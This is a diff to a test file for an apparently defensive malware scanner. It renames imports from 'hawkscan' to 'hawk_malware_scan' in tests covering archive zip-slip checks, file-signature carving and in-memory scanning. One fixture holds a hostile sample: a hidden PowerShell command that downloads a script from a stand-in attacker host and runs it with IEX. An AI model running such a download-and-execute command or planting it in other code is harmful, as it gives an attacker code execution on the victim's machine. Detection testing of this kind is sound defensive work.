@@ -16,9 +16,9 @@ import zipfile
 
 import pytest
 
-from hawkscan.core.engine import Engine
-from hawkscan.core.findings import Verdict
-from hawkscan.analyzers.yara_analyzer import YaraAnalyzer
+from hawk_malware_scan.core.engine import Engine
+from hawk_malware_scan.core.findings import Verdict
+from hawk_malware_scan.analyzers.yara_analyzer import YaraAnalyzer
 
 ENGINE = Engine()
 
@@ -249,9 +249,9 @@ def test_eval_packer_unrolled(tmp_path):
 
 def test_archive_lone_exe_and_zipslip(tmp_path):
     import zipfile
-    from hawkscan.analyzers.archive_analyzer import ArchiveAnalyzer
-    from hawkscan.analyzers.base import AnalysisContext
-    from hawkscan.core import fileinfo
+    from hawk_malware_scan.analyzers.archive_analyzer import ArchiveAnalyzer
+    from hawk_malware_scan.analyzers.base import AnalysisContext
+    from hawk_malware_scan.core import fileinfo
     # Lone executable wrapper.
     z1 = tmp_path / "a.zip"
     with zipfile.ZipFile(z1, "w") as zf:
@@ -272,9 +272,9 @@ def test_archive_lone_exe_and_zipslip(tmp_path):
 
 def test_carver_macho_and_ole_signatures(tmp_path):
     import struct
-    from hawkscan.analyzers.carver import Carver
-    from hawkscan.analyzers.base import AnalysisContext
-    from hawkscan.core import fileinfo
+    from hawk_malware_scan.analyzers.carver import Carver
+    from hawk_malware_scan.analyzers.base import AnalysisContext
+    from hawk_malware_scan.core import fileinfo
     macho = (b"\xcf\xfa\xed\xfe" + struct.pack("<iiIIIII", 0x01000007, 0, 2, 3, 0, 0, 0)
              + b"\x00" * 64)
     ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 128
@@ -297,7 +297,7 @@ def test_in_memory_scan_writes_no_payload_to_disk(tmp_path):
     import zipfile
 
     troot = tempfile.gettempdir()
-    before = set(glob.glob(os.path.join(troot, "hawkscan_*")))
+    before = set(glob.glob(os.path.join(troot, "hawk_malware_scan_*")))
 
     hidden = (b"powershell -w hidden -enc x; IEX (New-Object "
               b"Net.WebClient).DownloadString('http://evil.example/p.ps1')")
@@ -312,7 +312,7 @@ def test_in_memory_scan_writes_no_payload_to_disk(tmp_path):
                                    b"NtUnmapViewOfSection")
     assert any("Archived member" in f.title for f in ENGINE.scan(z).findings)
 
-    after = set(glob.glob(os.path.join(troot, "hawkscan_*")))
+    after = set(glob.glob(os.path.join(troot, "hawk_malware_scan_*")))
     assert after == before, f"payload temp dirs leaked: {after - before}"
 
 
